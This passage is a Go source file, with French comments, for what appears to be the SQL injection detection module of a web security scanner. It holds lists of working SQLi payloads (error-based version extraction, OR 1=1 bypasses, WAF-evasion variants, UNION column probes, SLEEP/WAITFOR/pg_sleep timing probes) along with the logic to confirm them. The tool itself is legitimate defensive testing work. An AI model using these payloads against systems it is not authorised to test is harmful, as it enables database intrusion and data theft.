// Package sqli détecte les injections SQL error-based et boolean-based.
package sqli

import (
	"context"
	"errors"
	"fmt"
	"math"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/auditcore/auditcore/internal/models"
	"github.com/auditcore/auditcore/internal/scanner/active"
	"github.com/auditcore/auditcore/internal/scanner/matchers"
	"github.com/google/uuid"
)

// Payloads error-based : déclenchent une erreur SQL visible sur MySQL, PostgreSQL,
// MSSQL, Oracle et SQLite. L'ordre part du plus léger (simple quote) vers des
// tentatives plus intrusives (commentaires, parenthèses, cast, extractvalue).
var errorPayloads = []string{
	// ── Rupture de contexte simple ─────────────────────────────────────
	"'",
	"''",
	"\"",
	"\\",
	"`",
	");",
	"')",
	"\")",
	// ── Contexte numérique ─────────────────────────────────────────────
	"1)",
	"1))",
	"1'",
	"1\"",
	// ── OR-based classiques ────────────────────────────────────────────
	"' OR '1'='1",
	"' OR 1=1--",
	"' OR 1=1#",
	"' OR 1=1/*",
	`" OR "1"="1`,
	`" OR 1=1--`,
	`') OR ('1'='1`,
	`')) OR (('1'='1`,
	// ── Provoquer une erreur de syntaxe / cast ─────────────────────────
	"1'||(SELECT 1)||'",
	"1/(SELECT 0)",
	"CAST('abc' AS SIGNED)",
	// ── Error-based extraction (MySQL, MSSQL, PostgreSQL, Oracle) ──────
	"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--",
	"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION())),1)--",
	"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT VERSION()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
	"' AND 1=CONVERT(int,(SELECT @@version))--",                                                                    // MSSQL
	"' AND 1=CAST((SELECT version()) AS int)--",                                                                    // PostgreSQL
	"' AND 1=(SELECT UPPER(XMLType(CHR(60)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM dual)--", // Oracle
}

// Payloads boolean-based (paire vrai/faux). Les trois premières entrées sont
// requises par les tests unitaires (les handlers scannent "1=2" et "1'='2").
var booleanPairs = [][2]string{
	{"' AND '1'='1", "' AND '1'='2"},
	{"1 AND 1=1", "1 AND 1=2"},
	{"' AND 1=1--", "' AND 1=2--"},
	// Variantes de commentaire / guillemets doubles
	{`" AND "1"="1`, `" AND "1"="2`},
	{`" AND 1=1--`, `" AND 1=2--`},
	{"1) AND (1=1", "1) AND (1=2"},
	{"1)) AND ((1=1", "1)) AND ((1=2"},
	// Contextes sans quote, forme MSSQL/Postgres friendly
	{"1 AND 1=1--", "1 AND 1=2--"},
	{"1;--", "1 AND 1=2;--"},
	// Bypass WAF léger : espaces alternatifs, casse mixte
	{"1/**/AND/**/1=1", "1/**/AND/**/1=2"},
	{"1%09AND%091=1", "1%09AND%091=2"},
	{"1 aNd 1=1", "1 aNd 1=2"},
	// Booléen basé sur SUBSTRING (fingerprint générique)
	{"1 AND SUBSTRING('abc',1,1)='a'", "1 AND SUBSTRING('abc',1,1)='z'"},
}

// unionProbes : payloads UNION SELECT pour identifier le nombre de colonnes et
// la réflexion d'une valeur canari. La logique de test doit être branchée dans
// runDifferential si tu veux les activer (voir hook plus bas).
var unionProbes = []struct {
	columns int
	payload string
	canary  string
}{
	{1, "' UNION SELECT 'AUDIT-CANARY-1'--", "AUDIT-CANARY-1"},
	{2, "' UNION SELECT 'AUDIT-CANARY-1',NULL--", "AUDIT-CANARY-1"},
	{3, "' UNION SELECT 'AUDIT-CANARY-1',NULL,NULL--", "AUDIT-CANARY-1"},
	{4, "' UNION SELECT 'AUDIT-CANARY-1',NULL,NULL,NULL--", "AUDIT-CANARY-1"},
	{5, "' UNION SELECT 'AUDIT-CANARY-1',NULL,NULL,NULL,NULL--", "AUDIT-CANARY-1"},
	{6, "' UNION SELECT 'AUDIT-CANARY-1',NULL,NULL,NULL,NULL,NULL--", "AUDIT-CANARY-1"},
	// Variante ORDER BY pour comptage de colonnes
	{0, "' ORDER BY 10--", "order-probe"},
}

type Module struct{}

func New() *Module             { return &Module{} }
func (m *Module) Name() string { return "sqli-detection" }

func (m *Module) Plan(ctx *models.ModuleContext, findings []*models.Finding) []models.ActiveTestPlan {
	return active.PlansForModule(m.Name(), ctx, findings)
}

func (m *Module) RunActive(ctx context.Context, moduleCtx *models.ModuleContext, plan models.ActiveTestPlan, executor *active.Executor) *models.ActiveTestResult {
	return m.runDifferential(ctx, moduleCtx, plan, executor)
}

func (m *Module) runDifferential(ctx context.Context, moduleCtx *models.ModuleContext, plan models.ActiveTestPlan, executor *active.Executor) *models.ActiveTestResult {
	result := &models.ActiveTestResult{Status: models.ActiveTestFailed, Reason: "validation SQLi non finalisée"}
	param := plan.EntryPoint.Name
	if moduleCtx == nil || moduleCtx.Asset == nil || param == "" {
		result.Status = models.ActiveTestUntestable
		result.Reason = "aucun paramètre contrôlable à tester"
		return result
	}

	unionCanary := "AUDIT-CANARY-" + strings.ReplaceAll(uuid.NewString(), "-", "")
	baselineRequest, err := active.BuildRequest(moduleCtx.Asset, plan.EntryPoint, plan.EntryPoint.OriginalValue)
	if err != nil {
		result.Status = models.ActiveTestUntestable
		result.Reason = "requête de référence impossible à construire: " + err.Error()
		return result
	}
	if _, err := executor.DoBaseline(baselineRequest); err != nil {
		return finishTransportResult(result, executor, err)
	}
	// Deux références permettent de savoir si le contenu normalisé est stable.
	if executor.LimitReached() == "" && moduleCtx.Options.ActiveMaxRequestsPerTest != 1 {
		if reference, buildErr := active.BuildRequest(moduleCtx.Asset, plan.EntryPoint, plan.EntryPoint.OriginalValue); buildErr == nil {
			_, _ = executor.DoBaseline(reference)
		}
	}

	baselineExchange := lastExchange(executor.Exchanges(), "baseline")
	if baselineExchange == nil || baselineExchange.Response == nil {
		result.Status = models.ActiveTestFailed
		result.Reason = "la référence n'a produit aucune réponse exploitable"
		return finishEvidence(result, executor, plan, false)
	}
	if baselineExchange.Response.StatusCode >= 500 {
		result.Status = models.ActiveTestInconclusive
		result.Reason = fmt.Sprintf("baseline non fonctionnelle: HTTP %d, impossible de distinguer une erreur applicative d'une SQLi", baselineExchange.Response.StatusCode)
		return finishEvidence(result, executor, plan, false)
	}

	baselineSQLSignature := sqlErrorSignature(baselineExchange.Response.BodyPreview)
	var suspectReason string
	for _, payload := range errorPayloads[:boundedSQLiCount(len(errorPayloads), errorProbeLimit(moduleCtx.Options))] {
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			break
		}
		request, requestErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, payload)
		if requestErr != nil {
			continue
		}
		if _, requestErr = executor.Do("test", "error-based:"+payload, request); requestErr != nil {
			if executor.LimitReached() != "" {
				break
			}
			continue
		}
		exchange := lastExchange(executor.Exchanges(), "test")
		if exchange == nil || exchange.Response == nil {
			continue
		}
		signature := sqlErrorSignature(exchange.Response.BodyPreview)
		if signature == "" || signature == baselineSQLSignature {
			continue
		}
		executor.Step(models.ActiveTestComparing, "comparaison de l'erreur SQL à la baseline")
		// La même signature doit être reproduite par une seconde requête identique.
		repeatRequest, repeatErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, payload)
		if repeatErr != nil {
			continue
		}
		if _, repeatErr = executor.Do("test", "error-reproduction:"+payload, repeatRequest); repeatErr != nil {
			break
		}
		repeated := lastExchange(executor.Exchanges(), "test")
		if repeated != nil && repeated.Response != nil && sqlErrorSignature(repeated.Response.BodyPreview) == signature {
			executor.Step(models.ActiveTestValidating, "signature SQL spécifique reproduite")
			reason := fmt.Sprintf("signature SQL spécifique %q observée deux fois et absente de la baseline", signature)
			finding := buildActiveFinding(moduleCtx, param, payload, "sqli-error-based", reason, repeated)
			result.Status = models.ActiveTestConfirmed
			result.Reason = reason
			result.Findings = []*models.Finding{finding}
			result.MinimumConditionsMet = true
			executor.MarkMinimumProof()
			return finishEvidence(result, executor, plan, true)
		}
		suspectReason = "signature SQL observée mais non reproductible"
	}

	for _, pair := range booleanPairs[:boundedSQLiCount(len(booleanPairs), booleanPairLimit(moduleCtx.Options))] {
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			break
		}
		trueRequest, trueErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, pair[0])
		falseRequest, falseErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, pair[1])
		if trueErr != nil || falseErr != nil {
			continue
		}
		if _, trueErr = executor.Do("test", "boolean-true:"+pair[0], trueRequest); trueErr != nil {
			break
		}
		trueExchange := lastExchange(executor.Exchanges(), "test")
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			break
		}
		if _, falseErr = executor.Do("test", "boolean-false:"+pair[1], falseRequest); falseErr != nil {
			break
		}
		falseExchange := lastExchange(executor.Exchanges(), "test")
		if trueExchange == nil || falseExchange == nil || trueExchange.Response == nil || falseExchange.Response == nil {
			continue
		}

		executor.Step(models.ActiveTestComparing, "comparaison baseline / condition vraie / condition fausse")
		if !sameResponse(baselineExchange, trueExchange) || sameResponse(trueExchange, falseExchange) {
			continue
		}
		// Reproduction du couple pour écarter une variation dynamique isolée.
		reproduceTrue, reproduceTrueErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, pair[0])
		reproduceFalse, reproduceFalseErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, pair[1])
		if reproduceTrueErr != nil || reproduceFalseErr != nil {
			continue
		}
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			break
		}
		if _, reproduceTrueErr = executor.Do("test", "boolean-reproduce-true:"+pair[0], reproduceTrue); reproduceTrueErr != nil {
			break
		}
		trueRepeat := lastExchange(executor.Exchanges(), "test")
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			break
		}
		if _, reproduceFalseErr = executor.Do("test", "boolean-reproduce-false:"+pair[1], reproduceFalse); reproduceFalseErr != nil {
			break
		}
		falseRepeat := lastExchange(executor.Exchanges(), "test")
		if trueRepeat == nil || falseRepeat == nil || !sameResponse(baselineExchange, trueRepeat) || !sameResponse(falseExchange, falseRepeat) {
			suspectReason = "différence booléenne observée mais non reproductible"
			continue
		}

		executor.Step(models.ActiveTestReproducing, "couple vrai/faux reproduit")
		executor.Step(models.ActiveTestValidating, "différence conditionnelle cohérente validée")
		reason := "la condition vraie correspond à la baseline et la condition fausse produit une réponse différente, deux fois"
		finding := buildActiveFinding(moduleCtx, param, pair[0], "sqli-boolean-based", reason, trueRepeat)
		finding.Status = models.FindingConfirmed
		finding.Confidence = models.ConfidenceHigh
		result.Status = models.ActiveTestConfirmed
		result.Reason = reason
		result.Findings = []*models.Finding{finding}
		result.MinimumConditionsMet = true
		executor.MarkMinimumProof()
		return finishEvidence(result, executor, plan, true)
	}

	var timingEvidence *models.TimingEvidence
	if moduleCtx.Options.ActiveSQLiTimingEnabled && executor.LimitReached() == "" {
		timing := runTimeBased(moduleCtx, plan, executor)
		timingEvidence = timing.Evidence
		switch timing.Status {
		case models.ActiveTestConfirmed:
			executor.Step(models.ActiveTestValidating, timing.Reason)
			finding := buildActiveFinding(moduleCtx, param, timing.Payload, "sqli-time-based", timing.Reason, timing.Exchange)
			result.Status = models.ActiveTestConfirmed
			result.Reason = timing.Reason
			result.Findings = []*models.Finding{finding}
			result.MinimumConditionsMet = true
			executor.MarkMinimumProof()
			return finishEvidence(result, executor, plan, true, timingEvidence)
		case models.ActiveTestTimeout, models.ActiveTestFailed, models.ActiveTestCancelled:
			result.Status = timing.Status
			result.Reason = timing.Reason
			return finishEvidence(result, executor, plan, false, timingEvidence)
		case models.ActiveTestInconclusive:
			suspectReason = timing.Reason
		}
	}

	// UNION-based (canary reflected) : le canari doit apparaître dans la
	// réponse puis être reproduit avant de confirmer ce mode.
	for _, probe := range unionProbes[:boundedSQLiCount(len(unionProbes), unionProbeLimit(moduleCtx.Options))] {
		if probe.canary == "order-probe" {
			continue
		}
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			break
		}
		payload := strings.ReplaceAll(probe.payload, "AUDIT-CANARY-1", unionCanary)
		if strings.Contains(baselineExchange.Response.BodyPreview, unionCanary) {
			continue
		}
		request, err := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, payload)
		if err != nil {
			continue
		}
		if _, err = executor.Do("test", "union-probe:"+payload, request); err != nil {
			if executor.LimitReached() != "" {
				break
			}
			continue
		}
		exchange := lastExchange(executor.Exchanges(), "test")
		if exchange == nil || exchange.Response == nil || !strings.Contains(exchange.Response.BodyPreview, unionCanary) {
			continue
		}
		repeat, repErr := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, payload)
		if repErr != nil {
			continue
		}
		if _, repErr = executor.Do("test", "union-reproduction:"+payload, repeat); repErr != nil {
			break
		}
		repeated := lastExchange(executor.Exchanges(), "test")
		if repeated == nil || repeated.Response == nil || !strings.Contains(repeated.Response.BodyPreview, unionCanary) {
			suspectReason = "canari UNION reflété une seule fois, non reproductible"
			continue
		}
		executor.Step(models.ActiveTestValidating, "canari UNION reflété deux fois")
		reason := fmt.Sprintf("canari %q reflété par la réponse via UNION SELECT (%d colonne(s))", unionCanary, probe.columns)
		finding := buildActiveFinding(moduleCtx, param, payload, "sqli-union-based", reason, repeated)
		result.Status = models.ActiveTestConfirmed
		result.Reason = reason
		result.Findings = []*models.Finding{finding}
		result.MinimumConditionsMet = true
		executor.MarkMinimumProof()
		return finishEvidence(result, executor, plan, true)
	}

	var orderFingerprintReason string
	for _, probe := range unionProbes {
		if probe.canary != "order-probe" || executor.LimitReached() != "" {
			continue
		}
		maxColumns := orderByMaxColumns(probe.payload)
		maxColumns = boundedSQLiCount(maxColumns, orderByProbeLimit(moduleCtx.Options))
		remaining := sqlRequestBudgetRemaining(executor, moduleCtx.Options)
		if remaining == 0 {
			// budget épuisé, on n'insiste pas
			break
		}
		if remaining > 0 {
			maxColumns = boundedSQLiCount(maxColumns, remaining)
		}
		// remaining < 0 → illimité, on garde maxColumns tel quel

		columns, fingerprintErr := runOrderByFingerprint(moduleCtx, plan, executor, probe.payload, maxColumns)
		if fingerprintErr == nil && columns > 0 {
			orderFingerprintReason = fmt.Sprintf("fingerprint ORDER BY : au moins %d colonne(s) acceptée(s), sans preuve UNION", columns)
		}
		break
	}

	if limit := executor.LimitReached(); limit != "" {
		result.Status = models.ActiveTestInconclusive
		result.Reason = "validation interrompue par la limite " + limit
		result.LimitReached = limit
	} else if suspectReason != "" {
		result.Status = models.ActiveTestInconclusive
		result.Reason = suspectReason
	} else {
		result.Status = models.ActiveTestNotConfirmed
		result.Reason = "les contrôles SQLi n'ont pas produit de différence reproductible"
		if orderFingerprintReason != "" {
			result.Reason += "; " + orderFingerprintReason
		}
	}
	result.MinimumConditionsMet = executor.Requests() > 0 && executor.Responses() > 0
	return finishEvidence(result, executor, plan, false, timingEvidence)
}

func boundedSQLiCount(available, requested int) int {
	if requested <= 0 || requested > available {
		return available
	}
	return requested
}

func errorProbeLimit(options models.AuditOptions) int {
	if options.ActiveMaxRequestsPerTest >= 48 {
		return 16
	}
	return 12
}

func booleanPairLimit(options models.AuditOptions) int {
	if options.ActiveMaxRequestsPerTest >= 48 {
		return 6
	}
	return 3
}

func unionProbeLimit(options models.AuditOptions) int {
	if options.ActiveMaxRequestsPerTest >= 48 {
		return 5
	}
	return 3
}

func orderByProbeLimit(options models.AuditOptions) int {
	if options.ActiveMaxRequestsPerTest >= 48 {
		return 8
	}
	return 6
}

func sqlRequestBudgetRemaining(executor *active.Executor, options models.AuditOptions) int {
	if executor == nil {
		return 0
	}
	if options.ActiveMaxRequestsPerTest <= 0 {
		return -1
	}
	remaining := options.ActiveMaxRequestsPerTest - executor.Requests()
	if remaining < 0 {
		return 0
	}
	return remaining
}

func sqlRequestBudgetAvailable(executor *active.Executor, options models.AuditOptions) bool {
	if executor == nil || executor.LimitReached() != "" {
		return false
	}
	return options.ActiveMaxRequestsPerTest <= 0 || executor.Requests() < options.ActiveMaxRequestsPerTest
}

func orderByMaxColumns(seed string) int {
	upper := strings.ToUpper(seed)
	index := strings.LastIndex(upper, "ORDER BY")
	if index >= 0 {
		fields := strings.Fields(seed[index+len("ORDER BY"):])
		if len(fields) > 0 {
			if value, err := strconv.Atoi(strings.Trim(fields[0], " -;")); err == nil && value > 0 {
				if value > 10 {
					return 10
				}
				return value
			}
		}
	}
	return 10
}

func orderByPayload(seed string, maxColumns, column int) string {
	maxText := strconv.Itoa(maxColumns)
	if strings.Contains(seed, maxText) {
		return strings.Replace(seed, maxText, strconv.Itoa(column), 1)
	}
	return fmt.Sprintf("' ORDER BY %d--", column)
}

func runOrderByFingerprint(moduleCtx *models.ModuleContext, plan models.ActiveTestPlan, executor *active.Executor, seed string, maxColumns int) (int, error) {
	if maxColumns <= 0 {
		maxColumns = 10
	}
	lastValid := 0
	for column := 1; column <= maxColumns; column++ {
		if !sqlRequestBudgetAvailable(executor, moduleCtx.Options) {
			return lastValid, nil
		}
		payload := orderByPayload(seed, maxColumns, column)
		request, err := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, payload)
		if err != nil {
			return lastValid, err
		}
		if _, err = executor.Do("test", fmt.Sprintf("union-order-by:%d", column), request); err != nil {
			if executor.LimitReached() != "" {
				return lastValid, nil
			}
			return lastValid, err
		}
		exchange := lastExchange(executor.Exchanges(), "test")
		if exchange == nil || exchange.Response == nil {
			return lastValid, nil
		}
		if exchange.Response.StatusCode >= 500 || sqlErrorSignature(exchange.Response.BodyPreview) != "" {
			break
		}
		lastValid = column
	}
	return lastValid, nil
}

type timingOutcome struct {
	Status   models.ActiveTestStatus
	Reason   string
	Evidence *models.TimingEvidence
	Payload  string
	Exchange *models.HTTPExchange
}

type timingStats struct {
	Median float64
	MAD    float64
}

// runTimeBased essaie les candidats DBMS dans un budget borné. Un candidat
// non concluant laisse une chance au suivant ; une erreur de transport ou un
// timeout arrête immédiatement le test.
func runTimeBased(moduleCtx *models.ModuleContext, plan models.ActiveTestPlan, executor *active.Executor) timingOutcome {
	delayMillis := timingDelayMillis(moduleCtx.Options)
	candidates := timingPayloadCandidates(plan.EntryPoint.OriginalValue, delayMillis)
	if len(candidates) == 0 {
		return timingOutcome{Status: models.ActiveTestInconclusive, Reason: "aucun candidat time-based disponible"}
	}
	limit := timingCandidateLimit(moduleCtx.Options, executor.Requests(), len(candidates))
	if limit == 0 {
		return timingOutcome{
			Status: models.ActiveTestInconclusive,
			Reason: "budget insuffisant pour exécuter une validation time-based complète",
		}
	}
	var last timingOutcome
	var lastInconclusive *timingOutcome
	tried := make([]string, 0, limit)
	for _, candidate := range candidates[:limit] {
		tried = append(tried, candidate.dbms)
		last = runTimeBasedCandidate(moduleCtx, plan, executor, candidate)
		switch last.Status {
		case models.ActiveTestConfirmed, models.ActiveTestTimeout, models.ActiveTestFailed, models.ActiveTestCancelled:
			return last
		}
		if last.Status == models.ActiveTestInconclusive {
			copyOutcome := last
			lastInconclusive = &copyOutcome
		}
		if executor.LimitReached() != "" {
			last.Status = models.ActiveTestInconclusive
			last.Reason = "validation time-based interrompue par la limite " + executor.LimitReached()
			break
		}
	}
	if last.Status == models.ActiveTestNotConfirmed && lastInconclusive != nil {
		last = *lastInconclusive
	}
	if len(tried) > 0 && last.Reason != "" {
		last.Reason = fmt.Sprintf("candidats temporels testés [%s]: %s", strings.Join(tried, ", "), last.Reason)
	}
	return last
}

// runTimeBasedCandidate valide un candidat temporel avec médianes, MAD et
// reproduction. Aucun candidat n'extrait de données.
func runTimeBasedCandidate(moduleCtx *models.ModuleContext, plan models.ActiveTestPlan, executor *active.Executor, candidate timingCandidate) timingOutcome {
	delayMillis := timingDelayMillis(moduleCtx.Options)
	baselineTarget := timingSampleCount(moduleCtx.Options.ActiveSQLiTimingBaselineSamples, 2)
	controlTarget := timingSampleCount(moduleCtx.Options.ActiveSQLiTimingControlSamples, 2)
	probeTarget := timingSampleCount(moduleCtx.Options.ActiveSQLiTimingProbeSamples, 2)
	reproductionTarget := timingSampleCount(moduleCtx.Options.ActiveSQLiTimingReproductionSamples, 1)

	positivePayload := candidate.positive
	controlPayload := candidate.control
	injectionContext := candidate.context
	evidence := &models.TimingEvidence{
		Strategy:    candidate.dbms + "-timing",
		Context:     injectionContext,
		DelayMillis: int64(delayMillis),
		Rule:        "baseline et contrôle neutre stables; médiane de la probe supérieure au contrôle d'au moins le seuil adaptatif; reproduction positive requise",
	}
	out := timingOutcome{Status: models.ActiveTestInconclusive, Evidence: evidence, Payload: positivePayload}

	baseline := executor.Baseline()
	if baseline == nil {
		out.Reason = "aucune baseline disponible pour la validation time-based"
		return out
	}
	baselineSamples := timingDurations(baseline.Exchanges)
	for len(baselineSamples) < baselineTarget && executor.LimitReached() == "" {
		request, err := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, plan.EntryPoint.OriginalValue)
		if err != nil {
			out.Reason = "baseline time-based impossible à construire: " + err.Error()
			return out
		}
		if _, err = executor.DoBaseline(request); err != nil {
			return timingErrorOutcome(out, executor, err)
		}
		baseline = executor.Baseline()
		baselineSamples = timingDurations(baseline.Exchanges)
	}
	if len(baselineSamples) < baselineTarget {
		out.Reason = fmt.Sprintf("baseline time-based insuffisante: %d/%d échantillon(s)", len(baselineSamples), baselineTarget)
		return out
	}
	if !baseline.Stable {
		out.Reason = "baseline instable: le contenu normalisé varie déjà avant la probe time-based"
		return out
	}
	if last := lastResponse(baseline.Exchanges); last == nil || last.StatusCode >= 500 {
		out.Reason = "baseline time-based non fonctionnelle, impossible de distinguer une lenteur applicative d'une SQLi"
		return out
	}

	evidence.BaselineMillis = append([]int64(nil), baselineSamples[len(baselineSamples)-baselineTarget:]...)
	controlSamples, _, err := collectTimingSamples(moduleCtx, plan, executor, controlPayload, controlTarget, "timing-control")
	if err != nil {
		return timingErrorOutcome(out, executor, err)
	}
	evidence.ControlMillis = controlSamples
	probeSamples, probeExchanges, err := collectTimingSamples(moduleCtx, plan, executor, positivePayload, probeTarget, "timing-probe")
	if err != nil {
		return timingErrorOutcome(out, executor, err)
	}
	evidence.ProbeMillis = probeSamples
	out.Exchange = lastExchange(probeExchanges, "test")

	baseStats := timingStatistics(evidence.BaselineMillis)
	controlStats := timingStatistics(evidence.ControlMillis)
	probeStats := timingStatistics(evidence.ProbeMillis)
	evidence.BaselineMedianMillis = baseStats.Median
	evidence.ControlMedianMillis = controlStats.Median
	evidence.ProbeMedianMillis = probeStats.Median
	evidence.BaselineMADMillis = baseStats.MAD
	evidence.ControlMADMillis = controlStats.MAD
	evidence.ProbeMADMillis = probeStats.MAD
	executor.Step(models.ActiveTestComparing, "comparaison statistique baseline / contrôle neutre / probe temporelle")

	maxMAD := math.Max(baseStats.MAD, math.Max(controlStats.MAD, probeStats.MAD))
	unstableLimit := math.Max(250, float64(delayMillis))
	if maxMAD > unstableLimit {
		out.Reason = fmt.Sprintf("variance temporelle trop élevée: MAD maximale %.0f ms, limite %.0f ms", maxMAD, unstableLimit)
		return out
	}
	stabilityThreshold := math.Max(100, 3*math.Max(baseStats.MAD, controlStats.MAD))
	if math.Abs(controlStats.Median-baseStats.Median) > stabilityThreshold {
		out.Reason = fmt.Sprintf("contrôle neutre non comparable à la baseline: %.0f ms contre %.0f ms, tolérance %.0f ms", controlStats.Median, baseStats.Median, stabilityThreshold)
		return out
	}

	threshold := math.Max(stabilityThreshold, float64(delayMillis)*0.35)
	evidence.ThresholdMillis = threshold
	probeLimit := controlStats.Median + threshold
	for _, duration := range evidence.ProbeMillis {
		if float64(duration) >= probeLimit {
			evidence.ProbeAboveThreshold++
		}
	}
	if evidence.ProbeAboveThreshold < (len(evidence.ProbeMillis)+1)/2 {
		out.Status = models.ActiveTestNotConfirmed
		out.Reason = fmt.Sprintf("probe non retardée de façon suffisante: médiane %.0f ms, contrôle %.0f ms, seuil %.0f ms", probeStats.Median, controlStats.Median, threshold)
		return out
	}

	executor.Step(models.ActiveTestReproducing, "reproduction de la probe temporelle")
	reproductionSamples, reproductionExchanges, err := collectTimingSamples(moduleCtx, plan, executor, positivePayload, reproductionTarget, "timing-reproduction")
	if err != nil {
		return timingErrorOutcome(out, executor, err)
	}
	evidence.ReproductionMillis = reproductionSamples
	out.Exchange = lastExchange(reproductionExchanges, "test")
	reproductionStats := timingStatistics(evidence.ReproductionMillis)
	evidence.ReproductionMedianMillis = reproductionStats.Median
	for _, duration := range evidence.ReproductionMillis {
		if float64(duration) >= probeLimit {
			evidence.ReproductionAboveThreshold++
		}
	}
	if evidence.ReproductionAboveThreshold < (len(evidence.ReproductionMillis)+1)/2 {
		out.Status = models.ActiveTestInconclusive
		out.Reason = fmt.Sprintf("retardement observé mais non reproduit: médiane probe %.0f ms, médiane reproduction %.0f ms, seuil %.0f ms", probeStats.Median, reproductionStats.Median, threshold)
		return out
	}

	evidence.Significant = true
	out.Status = models.ActiveTestConfirmed
	out.Reason = fmt.Sprintf("retardement time-based reproductible: baseline %.0f ms, contrôle %.0f ms, probe %.0f ms, reproduction %.0f ms, seuil %.0f ms", baseStats.Median, controlStats.Median, probeStats.Median, reproductionStats.Median, threshold)
	return out
}

func timingErrorOutcome(out timingOutcome, executor *active.Executor, err error) timingOutcome {
	switch {
	case errors.Is(err, context.Canceled):
		out.Status = models.ActiveTestCancelled
	case errors.Is(err, context.DeadlineExceeded):
		out.Status = models.ActiveTestTimeout
	case errors.Is(err, active.ErrRequestBudget):
		out.Status = models.ActiveTestInconclusive
	case errors.Is(err, active.ErrProofReached):
		out.Status = models.ActiveTestInconclusive
	default:
		out.Status = models.ActiveTestFailed
	}
	if executor.LimitReached() != "" {
		out.Reason = "validation time-based interrompue par la limite " + executor.LimitReached()
	} else {
		out.Reason = "échange HTTP time-based interrompu: " + err.Error()
	}
	return out
}

func collectTimingSamples(moduleCtx *models.ModuleContext, plan models.ActiveTestPlan, executor *active.Executor, value string, count int, label string) ([]int64, []models.HTTPExchange, error) {
	var durations []int64
	var exchanges []models.HTTPExchange
	for index := 0; index < count; index++ {
		request, err := active.BuildProbeRequest(moduleCtx.Asset, plan.EntryPoint, value)
		if err != nil {
			return durations, exchanges, err
		}
		if _, err = executor.Do("test", fmt.Sprintf("%s:%d", label, index+1), request); err != nil {
			return durations, exchanges, err
		}
		exchange := lastExchange(executor.Exchanges(), "test")
		if exchange == nil || exchange.Response == nil {
			return durations, exchanges, errors.New("réponse time-based absente")
		}
		exchanges = append(exchanges, *exchange)
		durations = append(durations, exchange.Response.DurationMillis)
	}
	return durations, exchanges, nil
}

func timingDelayMillis(options models.AuditOptions) int {
	delayMillis := options.ActiveSQLiTimingDelayMillis
	if delayMillis <= 0 {
		delayMillis = 500
	}
	if delayMillis > 2000 {
		delayMillis = 2000
	}
	return delayMillis
}

func timingCandidateLimit(options models.AuditOptions, requests, available int) int {
	if available <= 0 {
		return 0
	}
	maxRequests := options.ActiveMaxRequestsPerTest
	if maxRequests <= 0 {
		return available
	}
	remaining := maxRequests - requests
	perCandidate := timingSampleCount(options.ActiveSQLiTimingControlSamples, 2) +
		timingSampleCount(options.ActiveSQLiTimingProbeSamples, 2) +
		timingSampleCount(options.ActiveSQLiTimingReproductionSamples, 1)
	if perCandidate <= 0 {
		perCandidate = 1
	}
	limit := remaining / perCandidate
	if limit < 1 {
		return 0
	}
	return boundedSQLiCount(available, limit)
}

// timingPayloads renvoie la sonde MySQL par défaut. Elle peut être étendue via
// timingPayloadCandidates si tu veux essayer PostgreSQL / MSSQL / Oracle en
// cascade quand la sonde MySQL n'a rien donné.
func timingPayloads(original string, delayMillis int) (string, string, string) {
	candidates := timingPayloadCandidates(original, delayMillis)
	// La première entrée reste MySQL SLEEP() pour garder la compat des tests.
	first := candidates[0]
	return first.positive, first.control, first.context
}

type timingCandidate struct {
	dbms     string
	context  string
	positive string
	control  string
}

func timingPayloadCandidates(original string, delayMillis int) []timingCandidate {
	base := strings.TrimSpace(original)
	if base == "" {
		base = "1"
	}
	seconds := strconv.FormatFloat(float64(delayMillis)/1000, 'f', 3, 64)
	seconds = strings.TrimRight(strings.TrimRight(seconds, "0"), ".")

	if _, err := strconv.ParseFloat(base, 64); err == nil {
		return []timingCandidate{
			// MySQL / MariaDB — priorité (compat tests)
			{dbms: "mysql", context: "numeric",
				positive: base + " AND SLEEP(" + seconds + ")",
				control:  base + " AND SLEEP(0)"},
			// MySQL / MariaDB — alternative CPU bornée si SLEEP est filtré.
			{dbms: "mysql-benchmark", context: "numeric",
				positive: base + " AND BENCHMARK(" + strconv.Itoa(benchmarkIterations(delayMillis)) + ",SHA2('auditcore',256))",
				control:  base + " AND BENCHMARK(1,SHA2('auditcore',256))"},
			// PostgreSQL
			{dbms: "postgresql", context: "numeric",
				positive: base + " AND (SELECT pg_sleep(" + seconds + ")) IS NOT NULL",
				control:  base + " AND (SELECT pg_sleep(0)) IS NOT NULL"},
			// MSSQL — WAITFOR DELAY, exprimé en 'hh:mm:ss.mmm'
			{dbms: "mssql", context: "stacked",
				positive: base + "; WAITFOR DELAY '0:0:" + seconds + "'--",
				control:  base + "; WAITFOR DELAY '0:0:0'--"},
			// Oracle — DBMS_PIPE.RECEIVE_MESSAGE (secondes entières)
			{dbms: "oracle", context: "numeric",
				positive: base + " AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a'," + oracleSeconds(delayMillis) + ") FROM dual)",
				control:  base + " AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',0) FROM dual)"},
			// SQLite — travail borné : SQLite ne dispose pas d'un sleep natif.
			{dbms: "sqlite", context: "numeric",
